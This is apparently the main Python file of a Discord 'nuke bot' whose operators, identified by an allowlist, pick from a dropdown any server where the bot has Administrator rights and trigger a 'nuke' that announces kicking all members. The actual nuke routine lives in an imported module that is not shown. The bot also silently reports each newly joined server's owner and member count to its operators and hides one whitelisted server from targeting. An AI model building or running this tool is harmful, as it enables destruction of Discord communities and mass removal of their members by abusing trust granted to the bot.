import os
import asyncio
import discord
from discord.ext import commands
from discord.ui import Select, View
from discord import SelectOption
from dotenv import load_dotenv
from utils import get_admin_guilds
from nuker import nuke_server
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler

load_dotenv()
TOKEN = os.getenv("BOT_TOKEN")
ALLOWED_USERS = [int(x.strip()) for x in os.getenv("ALLOWED_USERS", "").split(",") if x.strip().isdigit()]
WHITELIST_SERVER_ID = int(os.getenv("WHITELIST_SERVER_ID", 0))
PORT = int(os.getenv("PORT", 10000))

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True

bot = commands.Bot(command_prefix="!", intents=intents)
bot.remove_command("help")

# ------------------ HTTP Server for Render port binding ------------------
class HealthCheckHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        # Fixed: ASCII only, no emoji in bytes
        self.wfile.write(b"<html><body><h1>Shanks Bot is Running!</h1></body></html>")
    
    def log_message(self, format, *args):
        return  # Suppress logs

def run_http_server():
    try:
        server = HTTPServer(('0.0.0.0', PORT), HealthCheckHandler)
        print(f"✅ HTTP Server running on port {PORT}")
        server.serve_forever()
    except Exception as e:
        print(f"⚠️ HTTP Server error: {e}")

# Start HTTP server in background thread
thread = threading.Thread(target=run_http_server, daemon=True)
thread.start()

# ------------------ Auto message on guild join ------------------
@bot.event
async def on_guild_join(guild):
    embed = discord.Embed(
        title="🎉 New Server Joined!",
        description=f"✅ Successfully joined **{guild.name}**",
        color=discord.Color.green()
    )
    embed.add_field(name="👥 Members", value=guild.member_count)
    embed.add_field(name="👑 Owner", value=guild.owner.mention if guild.owner else "Unknown")
    embed.set_footer(text="🔥 Shanks Bot")
    embed.timestamp = discord.utils.utcnow()

    for user_id in ALLOWED_USERS:
        user = bot.get_user(user_id)
        if user:
            try:
                await user.send(embed=embed)
            except:
                pass

# ------------------ On message (only allowed users) ------------------
@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    if message.author.id not in ALLOWED_USERS:
        return
    if not isinstance(message.channel, discord.DMChannel):
        return
    await bot.process_commands(message)

# ------------------ Dropdown for server selection ------------------
class ServerSelect(Select):
    def __init__(self, guilds, author):
        options = []
        for g in guilds:
            # Whitelisted server ko completely hide karo
            if g.id == WHITELIST_SERVER_ID:
                continue
            
            label = f"🔥 {g.name[:90]}"
            description = f"👥 {g.member_count} members"
            
            options.append(SelectOption(
                label=label[:100],
                value=str(g.id),
                description=description[:100],
                emoji="🔥"
            ))
        
        if not options:
            options.append(SelectOption(
                label="❌ No servers available",
                value="none",
                description="You don't have any nukable servers",
                emoji="❌"
            ))
        
        super().__init__(
            placeholder="📋 Select a server to nuke...",
            options=options,
            min_values=1,
            max_values=1
        )
        self.guilds = guilds
        self.author = author

    async def callback(self, interaction: discord.Interaction):
        if interaction.user.id != self.author.id:
            await interaction.response.send_message("❌ You can't use this menu.", ephemeral=True)
            return

        if self.values[0] == "none":
            await interaction.response.send_message("❌ No servers available to nuke.", ephemeral=True)
            return

        guild_id = int(self.values[0])
        guild = bot.get_guild(guild_id)
        
        if not guild:
            await interaction.response.send_message("❌ Server not found.", ephemeral=True)
            return

        if guild.id == WHITELIST_SERVER_ID:
            await interaction.response.send_message("❌ Server not found.", ephemeral=True)
            return

        # Ask for invite link
        embed = discord.Embed(
            title="🔗 Server Invite Link",
            description=f"Send the **permanent invite link** for **{guild.name}**",
            color=discord.Color.blue()
        )
        embed.add_field(name="📝 Example", value="`https://discord.gg/abc123`", inline=False)
        embed.set_footer(text="You have 60 seconds to reply")
        
        await interaction.response.send_message(embed=embed, ephemeral=False)

        def check(m):
            return m.author == interaction.user and m.channel == interaction.channel and "discord.gg" in m.content.lower()

        try:
            msg = await bot.wait_for("message", check=check, timeout=60)
            invite_link = msg.content.strip()
        except asyncio.TimeoutError:
            await interaction.followup.send("❌ Timeout! Please try again with `!list`.")
            return

        await interaction.followup.send(f"🔥 **NUKE STARTED** on **{guild.name}**! Kicking {guild.member_count} members...")
        asyncio.create_task(nuke_server(guild, bot, interaction.user, invite_link))

class ServerSelectView(View):
    def __init__(self, guilds, author):
        super().__init__(timeout=120)
        self.add_item(ServerSelect(guilds, author))

# ------------------ Commands ------------------
@bot.command(name="list")
async def list_servers(ctx):
    admin_guilds = await get_admin_guilds(bot, ctx.author)
    admin_guilds = [g for g in admin_guilds if g.id != WHITELIST_SERVER_ID]
    
    if not admin_guilds:
        embed = discord.Embed(
            title="❌ No Servers Available",
            description="You don't have Administrator permission in any server.",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)
        return

    embed = discord.Embed(
        title="📋 Available Servers",
        description="Select a server from the dropdown below to nuke.",
        color=discord.Color.purple()
    )
    embed.add_field(
        name="📊 Total Servers",
        value=f"{len(admin_guilds)} servers available to nuke",
        inline=False
    )
    embed.set_footer(text="🔥 Shanks Nuke Bot")
    embed.timestamp = discord.utils.utcnow()
    
    await ctx.send(embed=embed)
    view = ServerSelectView(admin_guilds, ctx.author)
    await ctx.send("🎯 **Select a server to nuke:**", view=view)

# ------------------ Error handler ------------------
@bot.event
async def on_command_error(ctx, error):
    embed = discord.Embed(
        title="❌ Error",
        description=f"```{error}```",
        color=discord.Color.red()
    )
    await ctx.send(embed=embed)
    raise error

# ------------------ Run bot ------------------
if __name__ == "__main__":
    print("🤖 Starting Shanks Bot...")
    print(f"🌐 HTTP Server will run on port {PORT}")
    bot.run(TOKEN)
